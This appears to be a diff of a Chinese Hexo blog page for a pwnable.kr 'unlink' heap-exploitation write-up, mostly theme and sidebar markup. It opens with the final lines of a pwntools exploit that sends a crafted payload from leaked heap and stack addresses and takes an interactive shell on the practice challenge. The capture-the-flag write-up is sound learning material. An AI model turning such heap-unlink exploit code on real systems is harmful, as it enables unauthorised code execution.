"</span>)</span><br><span class="line">heap_addr = p.recv(<span class="number">9</span>)</span><br><span class="line">heap_addr = int(heap_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(shell_addr)+<span class="string">'a'</span>*<span class="number">12</span>+p32(heap_addr + <span class="number">12</span>)+p32(stack_addr +<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -509,375 +535,337 @@ BK-&gt;fd=FD&lt;=&gt;P-&gt;bk-&gt;fd= P-&gt;fd</code></pre><h4 id="unlink引发�
 <p><a href="https://www.cnblogs.com/liuyimin/articles/7381018.html" target="_blank" rel="noopener">pwnable.kr unlink之write up</a></p>
 <p><a href="https://www.cnblogs.com/p4nda/p/7172104.html" target="_blank" rel="noopener">【pwnable.kr】 unlink</a></p>
 
-    </div>
-
+    </article>
+    <!-- license  -->
     
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://skyedai910.github.io">SkYe</a>
+            <p>原文链接：<a href="https://skyedai910.github.io/unlinked-pwnable/">https://skyedai910.github.io/unlinked-pwnable/</a>
+            <p>发表日期：<a href="https://skyedai910.github.io/unlinked-pwnable/">September 30th 2019, 8:00:00 pm</a>
+            <p>更新日期：<a href="https://skyedai910.github.io/unlinked-pwnable/">October 2nd 2019, 9:53:56 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
-    
-      <div>
-      
-        
-<div class="my_post_copyright">
-  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
-  
-  <!-- JS库 sweetalert 可修改路径 -->
-  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
-  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/unlinked-pwnable/">unlink - pwnable.kr</a></p>
-  <p><span>文章作者:</span><a href="/" title="访问 SkYe 的个人博客">SkYe</a></p>
-  <p><span>发布时间:</span>2019年09月30日 - 20:09</p>
-  <p><span>最后更新:</span>2019年10月02日 - 21:10</p>
-  <p><span>原始链接:</span><a href="/unlinked-pwnable/" title="unlink - pwnable.kr">https://skyedai910.github.io/unlinked-pwnable/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://skyedai910.github.io/unlinked-pwnable/"  aria-label="复制成功！"></i></span>
-  </p>
-  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
-</div>
-<script> 
-    var clipboard = new Clipboard('.fa-clipboard');
-    $(".fa-clipboard").click(function(){
-      clipboard.on('success', function(){
-        swal({   
-          title: "",   
-          text: '复制成功',
-          icon: "success", 
-          showConfirmButton: true
-          });
-    });
-    });  
-</script>
-
-      
-</div>
-        
-      
-
-      <footer class="post-footer">
-          
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
             
-          
-          <div class="post-tags">
-            
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-            
-              <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
-            
-              <a href="/tags/堆/" rel="tag"># 堆</a>
-            
-              <a href="/tags/unlink/" rel="tag"># unlink</a>
-            
-          </div>
-        
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-            </div>
-
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/Hexo博客搭建&Next主题安装/" rel="prev" title="Hexo博客搭建&Next主题安装">
-                  Hexo博客搭建&Next主题安装 <i class="fa fa-chevron-right"></i>
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/Hexo博客搭建&Next主题安装/" title= "Hexo博客搭建&Next主题安装">
+                    <div class="nextTitle">Hexo博客搭建&Next主题安装</div>
                 </a>
-              
-            </div>
-          </div>
-        
-      </footer>
-    
-
-  <script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https'){
-   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else{
-  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
-</script>
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
-        </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
+            
         </li>
-        <li class="sidebar-nav-overview">
-          站点概览
+        <li class="previous">
+            
         </li>
-      </ul>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预习知识"><span class="nav-text">预习知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是unlinked"><span class="nav-text">什么是unlinked</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink漏洞条件"><span class="nav-text">unlink漏洞条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink的触发"><span class="nav-text">unlink的触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink解链原理"><span class="nav-text">unlink解链原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink引发漏洞原理"><span class="nav-text">unlink引发漏洞原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脚本"><span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">SkYe</p>
-  <div class="site-description" itemprop="description">一个渣渣极客er的笔记Blog</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">5</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
+<!-- City版安装代码已完成 -->
     
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-          
-            <a href="/categories/">
-          
-        
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">分类</span>
-        </a>
-      </div>
     
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-          
-            <a href="/tags/">
-          
-        
-        <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">标签</span>
-        </a>
-      </div>
-    
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/skyedai910" title="GitHub &rarr; https://github.com/skyedai910" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://blog.csdn.net/weixin_43921239" title="CSDN &rarr; https://blog.csdn.net/weixin_43921239" rel="noopener" target="_blank"><i class="fa fa-fw fa-copyright"></i>CSDN</a>
-      </span>
-    
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    
-  
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-  </div>
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
 
 
+    
+    
 
-      </div>
-        <div class="back-to-top motion-element">
-          <i class="fa fa-arrow-up"></i>
-          <span>0%</span>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
         </div>
-      
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:skye437231@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/skyedai910" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/63951799" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://blog.csdn.net/weixin_43921239" class="iconfont-archer others" target="_blank" title=others></a>
+            
+        
+    
+        
+    
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">SkYe</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-area-chart"></i>
-    </span>
-      <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">34k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
     
-    <span title="站点阅读时长">31 分钟</span>
-</div>
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
 
-<div class="powered-by">
-<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
-  本站访客数:<span id="busuanzi_value_site_uv"></span>
-</span>
-</div>
 
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a></div>
 
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?a7211121ad131786b3b450c7b06beeeb";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-</script>
 
-  &nbsp;&nbsp;|&nbsp;&nbsp;<span><a href="/sitemap.xml">Google网站地图</a></span>
-  &nbsp;&nbsp;|&nbsp;&nbsp;<span><a href="/baidusitemap.xml">百度网站地图</a></span>
 
-  </span>
 
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#预习知识"><span class="toc-number">1.</span> <span class="toc-text">预习知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是unlinked"><span class="toc-number">1.1.</span> <span class="toc-text">什么是unlinked</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink漏洞条件"><span class="toc-number">1.1.1.</span> <span class="toc-text">unlink漏洞条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink的触发"><span class="toc-number">1.1.2.</span> <span class="toc-text">unlink的触发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink解链原理"><span class="toc-number">1.1.3.</span> <span class="toc-text">unlink解链原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink引发漏洞原理"><span class="toc-number">1.1.4.</span> <span class="toc-text">unlink引发漏洞原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">4.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
         
-
-
-
-
-
-
-
-
-  <script>
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "//tajs.qq.com/stats?sId=66475450";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-  <script>
-    var _mtac = {};
-    (function() {
-      var mta = document.createElement("script");
-      mta.src = "https://pingjs.qq.com/h5/stats.js";
-      mta.setAttribute("name", "MTAH5");
-      mta.setAttribute("sid", "500698852");
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(mta, s);
-    })();
-  </script>
-
-
-        
-      </div>
-    </footer>
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/brain-fuck-pwnable-kr/" >brain fuck-pwnable.kr三种思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span><a class="archive-post-title" href= "/horcruxes-pwnable.kr/" >horcruxes-pwnable.kr</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href= "/Hexo博客与Next主题的高级应用/" >Hexo博客与Next主题的高级应用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/Hexo博客搭建&Next主题安装/" >Hexo博客搭建&Next主题安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/unlinked-pwnable/" >unlink - pwnable.kr</a>
+        </li>
+    
+    </div>
   </div>
-
-  
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
     
-  
-  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
-<script src="/js/schemes/pisces.js?v=7.4.0"></script>
-<script src="/js/next-boot.js?v=7.4.0"></script>
-
-
-
-  
-  <script>
-    (function(){
-      var bp = document.createElement('script');
-      var curProtocol = window.location.protocol.split(':')[0];
-      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(bp, s);
-    })();
-  </script>
-
-
-
-
-
-
-
-
-  <script src="/js/local-search.js?v=7.4.0"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+        <span class="sidebar-tag-name" data-tags="Hexo"><span class="iconfont-archer">&#xe606;</span>Hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="Next"><span class="iconfont-archer">&#xe606;</span>Next</span>
+    
+        <span class="sidebar-tag-name" data-tags="Blog"><span class="iconfont-archer">&#xe606;</span>Blog</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwnable.kr"><span class="iconfont-archer">&#xe606;</span>pwnable.kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="ROP"><span class="iconfont-archer">&#xe606;</span>ROP</span>
+    
+        <span class="sidebar-tag-name" data-tags="堆"><span class="iconfont-archer">&#xe606;</span>堆</span>
+    
+        <span class="sidebar-tag-name" data-tags="unlink"><span class="iconfont-archer">&#xe606;</span>unlink</span>
+    
+        <span class="sidebar-tag-name" data-tags="GOT覆写"><span class="iconfont-archer">&#xe606;</span>GOT覆写</span>
+    
+        <span class="sidebar-tag-name" data-tags="brain fuck"><span class="iconfont-archer">&#xe606;</span>brain fuck</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="pwn"><span class="iconfont-archer">&#xe60a;</span>pwn</span>
+    
+        <span class="sidebar-category-name" data-categories="pwn/pwnable-kr"><span class="iconfont-archer">&#xe60a;</span>pwn/pwnable-kr</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "SkYe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
+
+
